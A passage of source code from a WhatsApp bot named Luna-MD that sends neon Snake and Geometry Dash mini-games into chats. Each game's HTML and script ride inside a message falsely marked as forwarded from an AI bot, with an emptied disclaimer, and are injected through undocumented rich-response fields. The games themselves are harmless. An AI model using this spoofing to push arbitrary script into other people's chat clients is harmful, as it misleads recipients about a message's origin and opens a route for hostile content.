      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "snake": {
const html = String.raw`<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; }
body { margin: 0; background: transparent; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #eee; touch-action: manipulation; cursor: pointer; }
.wrap { width: 100%; max-width: 560px; margin: auto; padding: 12px; }
.card { background: rgba(15, 18, 28, 0.88); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(0, 243, 255, 0.25); border-radius: 16px; overflow: hidden; box-shadow: 0 8px 32px rgba(0, 243, 255, 0.15), 0 0 15px rgba(157, 78, 221, 0.2); }
.head { padding: 12px 16px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); display: flex; justify-content: space-between; align-items: center; background: linear-gradient(90deg, rgba(0,243,255,0.05), rgba(157,78,221,0.05)); }
.brand { font-size: 10px; letter-spacing: 2px; color: #00f3ff; font-weight: 700; text-transform: uppercase; }
.title { font-size: 19px; font-weight: 900; color: #fff; text-shadow: 0 0 10px rgba(0, 243, 255, 0.6); letter-spacing: 1px; }
.stats { text-align: right; display: flex; align-items: center; gap: 12px; }
.label { font-size: 9px; color: rgba(255, 255, 255, 0.5); font-weight: 600; }
.value { font-size: 16px; font-weight: 900; color: #00f3ff; text-shadow: 0 0 10px rgba(0, 243, 255, 0.8); }
.main { padding: 12px; position: relative; }
.board { position: relative; width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid rgba(0, 243, 255, 0.2); background: #080b12; }
canvas#game { width: 100%; height: auto; display: block; touch-action: none; }
.overlay { position: absolute; inset: 0; background: rgba(6, 9, 17, 0.85); backdrop-filter: blur(6px); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10; transition: opacity 0.2s ease; }
.overlay.hidden { opacity: 0; pointer-events: none; }
.overlay-title { font-size: 28px; font-weight: 900; color: #ff0055; text-shadow: 0 0 15px rgba(255,0,85,0.5); margin-bottom: 5px; }
.overlay-sub { font-size: 12px; color: rgba(255,255,255,0.7); font-weight: 600; letter-spacing: 1px; }
.button { background: linear-gradient(135deg, #00f3ff, #7209b7); border: none; border-radius: 8px; color: #fff; font-weight: 900; padding: 10px 24px; cursor: pointer; font-size: 12px; box-shadow: 0 4px 15px rgba(0,243,255,0.3); }
.button:active { transform: scale(0.95); }
.status { text-align: center; margin-top: 8px; font-size: 11px; color: rgba(255, 255, 255, 0.6); font-weight: 600; letter-spacing: 1px; }
.controls { display: flex; justify-content: center; margin-top: 12px; }
.pad { display: grid; grid-template-columns: repeat(3, 52px); grid-template-rows: repeat(2, 44px); gap: 6px; }
.pad .button { padding: 0; font-size: 18px; }
.up { grid-column: 2; }
.left { grid-column: 1; }
.down { grid-column: 2; }
.right { grid-column: 3; }
</style><body><div class="wrap"><div class="card"><div class="head"><div><div class="brand">Luna-MD • 2026</div><div class="title">NEON SNAKE</div></div><div class="stats"><div><div class="label">SCORE</div><div class="value" id="score">00000</div></div><div><div class="label">BEST</div><div class="value" id="best">00000</div></div></div></div>
<div class="main"><div class="board" id="board"><canvas id="game" width="560" height="300"></canvas><div class="overlay" id="overlay"><div class="overlay-title" id="overTitle">NEON SNAKE</div><div class="overlay-sub" id="overSub">EAT THE DOTS &bull; DO NOT CRASH</div><button class="button primary" id="start" style="margin-top:15px">START</button></div></div><div class="controls"><div class="pad"><button class="button up" data-dir="up">&#9650;</button><button class="button left" data-dir="left">&#9664;</button><button class="button down" data-dir="down">&#9660;</button><button class="button right" data-dir="right">&#9654;</button></div></div><div class="status" id="status">SPEED 1.0x</div></div></div></div>
<script>
const c=document.getElementById('game'),x=c.getContext('2d'),overlay=document.getElementById('overlay'),scoreEl=document.getElementById('score'),bestEl=document.getElementById('best'),statusEl=document.getElementById('status');const size=20,cols=28,rows=15;let snake,food,dir,next,score=0,best=0,playing=false,timer,startX=0,startY=0;
try{best=parseInt(localStorage.getItem('cylic_snake_best')||'0',10)||0}catch(e){}
function pad(v){return String(v).padStart(5,'0')}function placeFood(){do{food={x:Math.floor(Math.random()*cols),y:Math.floor(Math.random()*rows)}}while(snake.some(p=>p.x===food.x&&p.y===food.y))}
function speedDelay(){return Math.max(80,150-Math.floor(score/20)*7)}function schedule(){clearInterval(timer);timer=setInterval(tick,speedDelay())}
function reset(){snake=[{x:8,y:7},{x:7,y:7},{x:6,y:7}];dir={x:1,y:0};next={x:1,y:0};score=0;playing=true;placeFood();overlay.classList.add('hidden');schedule();updateUI();draw()}
function setDir(name){const d={up:{x:0,y:-1},down:{x:0,y:1},left:{x:-1,y:0},right:{x:1,y:0}}[name];if(!d||d.x===-dir.x&&d.y===-dir.y)return;next=d}
function tick(){if(!playing)return;dir=next;const head={x:snake[0].x+dir.x,y:snake[0].y+dir.y};if(head.x<0||head.x>=cols||head.y<0||head.y>=rows||snake.some(p=>p.x===head.x&&p.y===head.y))return gameOver();snake.unshift(head);if(head.x===food.x&&head.y===food.y){score+=10;best=Math.max(best,score);placeFood();schedule()}else snake.pop();updateUI();draw()}
function gameOver(){playing=false;clearInterval(timer);try{localStorage.setItem('cylic_snake_best',String(best))}catch(e){}document.getElementById('overTitle').textContent='GAME OVER';document.getElementById('overSub').textContent='SCORE '+score;document.getElementById('start').textContent='PLAY AGAIN';overlay.classList.remove('hidden')}
function updateUI(){scoreEl.textContent=pad(score);bestEl.textContent=pad(best);statusEl.textContent='LENGTH '+snake.length+' • SPEED '+(150/speedDelay()).toFixed(1)+'x'}
function draw(){const bg=x.createLinearGradient(0,0,0,300);bg.addColorStop(0,'#17272e');bg.addColorStop(1,'#091014');x.fillStyle=bg;x.fillRect(0,0,560,300);x.strokeStyle='rgba(255,255,255,.025)';for(let i=0;i<=cols;i++){x.beginPath();x.moveTo(i*size,0);x.lineTo(i*size,300);x.stroke()}for(let i=0;i<=rows;i++){x.beginPath();x.moveTo(0,i*size);x.lineTo(560,i*size);x.stroke()}x.fillStyle='#ff667f';x.shadowColor='#ff667f';x.shadowBlur=14;x.beginPath();x.arc(food.x*size+10,food.y*size+10,6,0,Math.PI*2);x.fill();x.shadowBlur=0;snake.forEach((p,i)=>{x.fillStyle=i===0?'#91ffe0':'#00b98d';x.fillRect(p.x*size+2,p.y*size+2,16,16)})}
document.getElementById('start').addEventListener('pointerdown',e=>{e.preventDefault();reset()});document.querySelectorAll('[data-dir]').forEach(b=>b.addEventListener('pointerdown',e=>{e.preventDefault();setDir(b.dataset.dir)}));document.addEventListener('keydown',e=>{const d={ArrowUp:'up',ArrowDown:'down',ArrowLeft:'left',ArrowRight:'right'}[e.key];if(d){e.preventDefault();setDir(d)}});c.addEventListener('pointerdown',e=>{startX=e.clientX;startY=e.clientY});c.addEventListener('pointerup',e=>{const dx=e.clientX-startX,dy=e.clientY-startY;if(Math.max(Math.abs(dx),Math.abs(dy))<16)return;setDir(Math.abs(dx)>Math.abs(dy)?(dx>0?'right':'left'):(dy>0?'down':'up'))});snake=[{x:8,y:7},{x:7,y:7},{x:6,y:7}];food={x:18,y:7};updateUI();draw();
</script></body>`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "geometry": { 
const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; }
body { margin: 0; background: transparent; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #eee; touch-action: manipulation; cursor: pointer; }
.gd-wrap { width: 100%; max-width: 640px; margin: auto; padding: 12px; }
.gd-card { background: rgba(15, 18, 28, 0.85); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(0, 243, 255, 0.25); border-radius: 16px; overflow: hidden; box-shadow: 0 8px 32px rgba(0, 243, 255, 0.15), 0 0 15px rgba(157, 78, 221, 0.2); }
.gd-header { padding: 14px 18px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); display: flex; justify-content: space-between; align-items: center; background: linear-gradient(90deg, rgba(0,243,255,0.05), rgba(157,78,221,0.05)); }
.gd-sub { font-size: 10px; letter-spacing: 2px; color: #00f3ff; font-weight: 700; text-transform: uppercase; display: flex; align-items: center; gap: 4px; }
.gd-title { font-size: 20px; font-weight: 900; color: #fff; text-shadow: 0 0 10px rgba(0, 243, 255, 0.6); letter-spacing: 1px; }
.gd-stats { text-align: right; display: flex; align-items: center; gap: 14px; }
.gd-score { font-size: 20px; font-weight: 900; color: #00f3ff; text-shadow: 0 0 12px rgba(0, 243, 255, 0.8); transition: transform 0.15s ease-out; }
.gd-best { font-size: 10px; color: rgba(255, 255, 255, 0.5); font-weight: 600; margin-top: 1px; display: flex; align-items: center; justify-content: flex-end; gap: 3px; }
.gd-audio-btn { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.2s ease; padding: 0; }
.gd-audio-btn:active { transform: scale(0.9); }
.gd-body { padding: 14px; position: relative; }
.gd-progress-wrap { width: 100%; height: 6px; background: rgba(255, 255, 255, 0.1); border-radius: 3px; margin-bottom: 10px; overflow: hidden; position: relative; }
.gd-progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #00f3ff, #9d4edd); border-radius: 3px; box-shadow: 0 0 8px #00f3ff; transition: width 0.1s linear; }
canvas#game { width: 100%; height: auto; background: #080b12; border: 1px solid rgba(0, 243, 255, 0.2); border-radius: 12px; display: block; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); }
.gd-status { display: flex; justify-content: space-between; margin-top: 8px; font-size: 11px; color: rgba(255, 255, 255, 0.6); font-weight: 600; }
.svg-icon { display: inline-block; vertical-align: middle; }
</style>

<div class="gd-wrap">
  <div class="gd-card">
    <div class="gd-header">
      <div>
        <div class="gd-sub">
          <svg class="svg-icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#00f3ff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"></rect><path d="M6 12h4m-2-2v4"></path><circle cx="17" cy="10" r="1" fill="#00f3ff"></circle><circle cx="15" cy="13" r="1" fill="#00f3ff"></circle></svg>
          Luna-MD
        </div>
        <div class="gd-title">Geometry Dash Mini</div>
      </div>
      <div class="gd-stats">
        <button id="soundToggle" class="gd-audio-btn" title="Toggle Sound">
          <svg id="iconAudioOn" class="svg-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00f3ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path></svg>
          <svg id="iconAudioOff" class="svg-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><line x1="23" y1="9" x2="17" y2="15"></line><line x1="17" y1="9" x2="23" y2="15"></line></svg>
        </button>
        <div>
          <div id="score" class="gd-score">0000</div>
          <div id="best" class="gd-best">
            <svg class="svg-icon" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.5)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path><path d="M4 22h16"></path><path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path><path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path><path d="M18 2H6v7a6 6 0 0 0 12 0V2z"></path></svg>
            <span id="bestText">BEST 0000</span>
          </div>
        </div>
      </div>
    </div>
    <div class="gd-body">
      <div class="gd-progress-wrap"><div id="progressBar" class="gd-progress-bar"></div></div>
      <canvas id="game" width="640" height="360"></canvas>
      <div class="gd-status">
        <span id="levelStatus">Level 1</span>
        <span id="speedStatus">Speed 5.2x</span>
      </div>
      <div style="font-size: 10px; color: rgba(0, 243, 255, 0.5); text-align: center; margin-top: 6px; font-weight: 600; letter-spacing: 1px;">Luna-MD • 2026</div>
    </div>
  </div>
</div>

<script>
(function() {
  const c = document.getElementById('game');
  const ctx = c.getContext('2d');
  const scoreEl = document.getElementById('score');
  const bestTextEl = document.getElementById('bestText');
  const progressBar = document.getElementById('progressBar');
  const levelStatus = document.getElementById('levelStatus');
  const speedStatus = document.getElementById('speedStatus');
  const soundBtn = document.getElementById('soundToggle');
  const iconAudioOn = document.getElementById('iconAudioOn');
  const iconAudioOff = document.getElementById('iconAudioOff');

  const GY = 290;
  const P_SIZE = 28;

  let audioCtx = null;
  let soundMuted = false;

  function initAudio() {
    if (!audioCtx) {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) audioCtx = new AudioCtx();
    }
    if (audioCtx && audioCtx.state === 'suspended') {
      audioCtx.resume();
    }
  }

  soundBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    soundMuted = !soundMuted;
    if (soundMuted) {
      iconAudioOn.style.display = 'none';
      iconAudioOff.style.display = 'inline-block';
    } else {
      iconAudioOn.style.display = 'inline-block';
      iconAudioOff.style.display = 'none';
    }
  });

  function playSound(type) {
    if (soundMuted) return;
    initAudio();
    if (!audioCtx) return;
    try {
      const now = audioCtx.currentTime;
      if (type === 'jump') {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'square';
        osc.frequency.setValueAtTime(220, now);
        osc.frequency.exponentialRampToValueAtTime(650, now + 0.12);
        gain.gain.setValueAtTime(0.12, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.12);
      } else if (type === 'double_jump') {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(400, now);
        osc.frequency.exponentialRampToValueAtTime(950, now + 0.14);
        gain.gain.setValueAtTime(0.15, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.14);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.14);
      } else if (type === 'crash') {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(160, now);
        osc.frequency.exponentialRampToValueAtTime(40, now + 0.25);
        gain.gain.setValueAtTime(0.25, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.25);
      } else if (type === 'level') {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(523, now);
        osc.frequency.setValueAtTime(659, now + 0.08);
        osc.frequency.setValueAtTime(783, now + 0.16);
        gain.gain.setValueAtTime(0.15, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + 0.3);
      }
    } catch(err) {}
  }

  function loadBest() {
    let vals = [];
    try { let v = localStorage.getItem('gd_best'); if (v) vals.push(parseInt(v, 10)); } catch(e){}
    try { let v = sessionStorage.getItem('gd_best'); if (v) vals.push(parseInt(v, 10)); } catch(e){}
    try { let m = document.cookie.match(/(?:^|;\\s*)gd_best=(\\d+)/); if (m) vals.push(parseInt(m[1], 10)); } catch(e){}
    return vals.length ? Math.max(...vals.filter(v => !isNaN(v))) : 0;
  }

  function saveBest(val) {
    let s = String(Math.floor(val));
    try { localStorage.setItem('gd_best', s); } catch(e){}
    try { sessionStorage.setItem('gd_best', s); } catch(e){}
    try { document.cookie = 'gd_best=' + s + ';max-age=31536000;path=/'; } catch(e){}
    try {
      let rq = indexedDB.open('gd_db', 1);
      rq.onupgradeneeded = () => rq.result.createObjectStore('kv');
      rq.onsuccess = () => { try { rq.result.transaction('kv', 'readwrite').objectStore('kv').put(s, 'gd_best'); } catch(e){} };
    } catch(e){}
  }

  function loadBestAsync(cb) {
    try {
      let rq = indexedDB.open('gd_db', 1);
      rq.onupgradeneeded = () => rq.result.createObjectStore('kv');
      rq.onsuccess = () => {
        try {
          let gr = rq.result.transaction('kv', 'readonly').objectStore('kv').get('gd_best');
          gr.onsuccess = () => { if (gr.result) cb(parseInt(gr.result, 10)); };
        } catch(e){}
      };
    } catch(e){}
  }

  let bestScore = loadBest();
  loadBestAsync(v => {
    if (!isNaN(v) && v > bestScore) {
      bestScore = v;
      bestTextEl.textContent = 'BEST ' + String(Math.floor(bestScore)).padStart(4, '0');
    }
  });

  const STATE_PLAYING = 1;
  const STATE_GAMEOVER = 2;

  let gameState = STATE_PLAYING;
  let player, obstacles, particles, trail, bgStars;
  let score, speed, level, levelProgress;
  let spawnTimer, lastTime, shake, flash, runTime;
  let accentColor = '#00f3ff';
  let secondaryColor = '#9d4edd';

  const themeColors = [
    { primary: '#00f3ff', secondary: '#9d4edd' },
    { primary: '#ff007f', secondary: '#ffb703' },
    { primary: '#00ff87', secondary: '#60efff' },
    { primary: '#ff5e00', secondary: '#ff0055' }
  ];

  function resetGame() {
    player = {
      x: 90,
      y: GY - P_SIZE,
      w: P_SIZE,
      h: P_SIZE,
      vy: 0,
      rotation: 0,
      isGrounded: true,
      jumpCount: 0,
      maxJumps: 2
    };
    obstacles = [];
    particles = [];
    trail = [];
    bgStars = [];
    for (let i = 0; i < 28; i++) {
      bgStars.push({
        x: Math.random() * c.width,
        y: Math.random() * (GY - 30),
        size: Math.random() * 2 + 1,
        speed: Math.random() * 0.4 + 0.1,
        alpha: Math.random() * 0.7 + 0.3
      });
    }
    score = 0;
    speed = 5.2;
    level = 1;
    levelProgress = 0;
    spawnTimer = 35;
    lastTime = 0;
    shake = 0;
    flash = 0;
    runTime = 0;

    let theme = themeColors[0];
    accentColor = theme.primary;
    secondaryColor = theme.secondary;

    scoreEl.textContent = '0000';
    bestTextEl.textContent = 'BEST ' + String(Math.floor(bestScore)).padStart(4, '0');
    speedStatus.textContent = 'Speed 5.2x';
    levelStatus.textContent = 'Level 1';
    progressBar.style.width = '0%';
  }

  function addBurst(x, y, count, color, maxSpd) {
    for (let i = 0; i < count; i++) {
      let angle = Math.random() * Math.PI * 2;
      let spd = (Math.random() * 0.8 + 0.2) * maxSpd;
      particles.push({
        x: x,
        y: y,
        vx: Math.cos(angle) * spd,
        vy: Math.sin(angle) * spd - 0.5,
        life: 1.0,
        color: color,
        size: Math.random() * 4 + 2
      });
    }
  }

  function triggerJump() {
    initAudio();
    if (gameState === STATE_GAMEOVER) {
      resetGame();
      gameState = STATE_PLAYING;
      performJump();
      return;
    }

    if (gameState === STATE_PLAYING) {
      performJump();
    }
  }

  function performJump() {
    if (player.jumpCount < player.maxJumps) {
      player.vy = -11.5;
      player.isGrounded = false;
      player.jumpCount++;

      if (player.jumpCount === 1) {
        playSound('jump');
        addBurst(player.x + P_SIZE/2, player.y + P_SIZE, 8, accentColor, 4);
      } else {
        playSound('double_jump');
        addBurst(player.x + P_SIZE/2, player.y + P_SIZE/2, 14, '#ffffff', 5);
        addBurst(player.x + P_SIZE/2, player.y + P_SIZE/2, 10, secondaryColor, 4.5);
      }
    }
  }

  function spawnObstacles() {
    let rand = Math.random();
    let startX = c.width + 20;

    if (rand < 0.25) {
      obstacles.push({ type: 'spike', x: startX, y: GY - 28, w: 24, h: 28 });
      if (Math.random() < 0.5) {
        obstacles.push({ type: 'spike', x: startX + 24, y: GY - 28, w: 24, h: 28 });
      }
    } else if (rand < 0.45) {
      let h1 = 32, h2 = 64;
      obstacles.push({ type: 'block', x: startX, y: GY - h1, w: 48, h: h1 });
      obstacles.push({ type: 'block', x: startX + 58, y: GY - h2, w: 48, h: h2 });
      if (level >= 2) {
        obstacles.push({ type: 'spike', x: startX + 70, y: GY - h2 - 24, w: 24, h: 24 });
      }
    } else if (rand < 0.65) {
      obstacles.push({ type: 'spike', x: startX + 20, y: GY - 28, w: 24, h: 28 });
      obstacles.push({ type: 'block', x: startX + 70, y: GY - 75, w: 64, h: 24 });
      obstacles.push({ type: 'spike', x: startX + 90, y: GY - 99, w: 24, h: 24 });
    } else if (rand < 0.82) {
      obstacles.push({ type: 'block', x: startX, y: GY - 32, w: 40, h: 32 });
      obstacles.push({ type: 'spike_down', x: startX + 60, y: GY - 130, w: 26, h: 30 });
      obstacles.push({ type: 'block', x: startX + 110, y: GY - 32, w: 40, h: 32 });
    } else {
      obstacles.push({ type: 'spike', x: startX, y: GY - 28, w: 24, h: 28 });
      obstacles.push({ type: 'block', x: startX + 45, y: GY - 60, w: 50, h: 24 });
      obstacles.push({ type: 'spike', x: startX + 110, y: GY - 28, w: 24, h: 28 });
    }
  }

  function checkCollision(p, obs) {
    let px = p.x + 3, py = p.y + 3, pw = p.w - 6, ph = p.h - 6;

    if (obs.type === 'spike' || obs.type === 'spike_down') {
      return (px < obs.x + obs.w && px + pw > obs.x && py < obs.y + obs.h && py + ph > obs.y);
    } else if (obs.type === 'block') {
      return (px < obs.x + obs.w && px + pw > obs.x && py < obs.y + obs.h && py + ph > obs.y);
    }
    return false;
  }

  function update(dt) {
    runTime += dt;

    if (gameState === STATE_PLAYING) {
      player.vy += 0.72 * dt;
      player.y += player.vy * dt;

      if (!player.isGrounded) {
        player.rotation += 0.22 * dt;
        trail.push({ x: player.x, y: player.y, rotation: player.rotation });
        if (trail.length > 6) trail.shift();
      } else {
        trail.length = 0;
        let snap = Math.round(player.rotation / (Math.PI / 2)) * (Math.PI / 2);
        player.rotation += (snap - player.rotation) * 0.35 * dt;
      }

      if (player.y >= GY - P_SIZE) {
        if (!player.isGrounded) {
          addBurst(player.x + P_SIZE/2, GY, 5, '#ffffff', 2);
        }
        player.y = GY - P_SIZE;
        player.vy = 0;
        player.isGrounded = true;
        player.jumpCount = 0;
      }

      obstacles.forEach(obs => {
        if (obs.type === 'block') {
          let pBottom = player.y + player.h;
          let pPrevBottom = pBottom - player.vy * dt;
          if (player.x + player.w - 6 > obs.x && player.x + 6 < obs.x + obs.w) {
            if (pPrevBottom <= obs.y + 8 && pBottom >= obs.y && player.vy >= 0) {
              player.y = obs.y - player.h;
              player.vy = 0;
              player.isGrounded = true;
              player.jumpCount = 0;
            }
          }
        }
      });

      bgStars.forEach(s => {
        s.x -= s.speed * speed * 0.25 * dt;
        if (s.x < 0) s.x = c.width;
      });

      spawnTimer -= dt;
      if (spawnTimer <= 0) {
        spawnObstacles();
        let minGap = Math.max(45, 85 - speed * 3.5);
        spawnTimer = minGap + Math.random() * 30;
      }

      obstacles.forEach(obs => obs.x -= speed * dt);
      obstacles = obstacles.filter(obs => obs.x > -120);

      particles.forEach(pt => {
        pt.x += pt.vx * dt;
        pt.y += pt.vy * dt;
        pt.vy += 0.2 * dt;
        pt.life -= 0.035 * dt;
      });
      particles = particles.filter(pt => pt.life > 0);

      speed = Math.min(11.0, speed + 0.0016 * dt);
      score += dt * 0.7;

      levelProgress = (score % 250) / 250;
      let newLevel = Math.floor(score / 250) + 1;
      if (newLevel !== level) {
        level = newLevel;
        playSound('level');
        flash = 0.8;
        let theme = themeColors[(level - 1) % themeColors.length];
        accentColor = theme.primary;
        secondaryColor = theme.secondary;
      }

      progressBar.style.width = Math.min(100, (levelProgress * 100)).toFixed(1) + '%';
      levelStatus.textContent = 'Level ' + level;
      speedStatus.textContent = 'Speed ' + speed.toFixed(1) + 'x';

      if (score > bestScore) {
        bestScore = score;
        saveBest(bestScore);
      }

      scoreEl.textContent = String(Math.floor(score)).padStart(4, '0');
      bestTextEl.textContent = 'BEST ' + String(Math.floor(bestScore)).padStart(4, '0');

      for (const obs of obstacles) {
        if (checkCollision(player, obs)) {
          gameState = STATE_GAMEOVER;
          shake = 16;
          flash = 1.0;
          playSound('crash');
          addBurst(player.x + P_SIZE/2, player.y + P_SIZE/2, 28, accentColor, 6);
          addBurst(player.x + P_SIZE/2, player.y + P_SIZE/2, 20, '#ff0055', 5);
          break;
        }
      }
    }

    if (shake > 0) shake = Math.max(0, shake - 0.7 * dt);
    if (flash > 0) flash = Math.max(0, flash - 0.05 * dt);
  }

  function drawGrid() {
    ctx.strokeStyle = accentColor;
    ctx.globalAlpha = 0.15;
    ctx.lineWidth = 1;
    let gridOffset = (runTime * speed * 2) % 24;

    ctx.beginPath();
    for (let x = -gridOffset; x < c.width; x += 24) {
      ctx.moveTo(x, GY);
      ctx.lineTo(x - 20, c.height);
    }
    ctx.stroke();

    ctx.beginPath();
    for (let y = GY; y < c.height; y += 14) {
      ctx.moveTo(0, y);
      ctx.lineTo(c.width, y);
    }
    ctx.stroke();
    ctx.globalAlpha = 1.0;
  }

  function draw() {
    ctx.clearRect(0, 0, c.width, c.height);

    ctx.save();
    if (shake > 0) {
      ctx.translate((Math.random() - 0.5) * shake, (Math.random() - 0.5) * shake);
    }

    let bgGrad = ctx.createLinearGradient(0, 0, 0, c.height);
    bgGrad.addColorStop(0, '#060911');
    bgGrad.addColorStop(1, '#0e1322');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, c.width, c.height);

    bgStars.forEach(s => {
      ctx.fillStyle = accentColor;
      ctx.globalAlpha = s.alpha * 0.5;
      ctx.fillRect(s.x, s.y, s.size, s.size);
    });
    ctx.globalAlpha = 1.0;

    let groundGrad = ctx.createLinearGradient(0, GY, 0, c.height);
    groundGrad.addColorStop(0, 'rgba(15, 20, 35, 0.95)');
    groundGrad.addColorStop(1, 'rgba(5, 8, 15, 1)');
    ctx.fillStyle = groundGrad;
    ctx.fillRect(0, GY, c.width, c.height - GY);

    ctx.shadowColor = accentColor;
    ctx.shadowBlur = 10;
    ctx.strokeStyle = accentColor;
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(0, GY);
    ctx.lineTo(c.width, GY);
    ctx.stroke();
    ctx.shadowBlur = 0;

    drawGrid();

    trail.forEach((t, idx) => {
      ctx.save();
      ctx.translate(t.x + P_SIZE/2, t.y + P_SIZE/2);
      ctx.rotate(t.rotation);
      ctx.fillStyle = accentColor;
      ctx.globalAlpha = 0.15 * (idx / trail.length);
      ctx.fillRect(-P_SIZE/2, -P_SIZE/2, P_SIZE, P_SIZE);
      ctx.restore();
    });

    if (gameState !== STATE_GAMEOVER) {
      ctx.save();
      ctx.translate(player.x + P_SIZE/2, player.y + P_SIZE/2);
      ctx.rotate(player.rotation);

      ctx.shadowColor = accentColor;
      ctx.shadowBlur = player.jumpCount === 2 ? 18 : 12;
      ctx.fillStyle = player.jumpCount === 2 ? '#ffffff' : accentColor;
      ctx.fillRect(-P_SIZE/2, -P_SIZE/2, P_SIZE, P_SIZE);

      ctx.fillStyle = '#060911';
      ctx.fillRect(-P_SIZE/2 + 4, -P_SIZE/2 + 4, P_SIZE - 8, P_SIZE - 8);

      ctx.fillStyle = secondaryColor;
      ctx.fillRect(-P_SIZE/2 + 8, -P_SIZE/2 + 8, P_SIZE - 16, P_SIZE - 16);

      ctx.restore();
    }

    obstacles.forEach(obs => {
      ctx.save();
      if (obs.type === 'spike') {
        ctx.shadowColor = '#ff0055';
        ctx.shadowBlur = 10;
        ctx.fillStyle = '#ff0055';
        ctx.beginPath();
        ctx.moveTo(obs.x + obs.w / 2, obs.y);
        ctx.lineTo(obs.x + obs.w, obs.y + obs.h);
        ctx.lineTo(obs.x, obs.y + obs.h);
        ctx.closePath();
        ctx.fill();

        ctx.strokeStyle = '#ffffff';
        ctx.lineWidth = 1.5;
        ctx.stroke();
      } else if (obs.type === 'spike_down') {
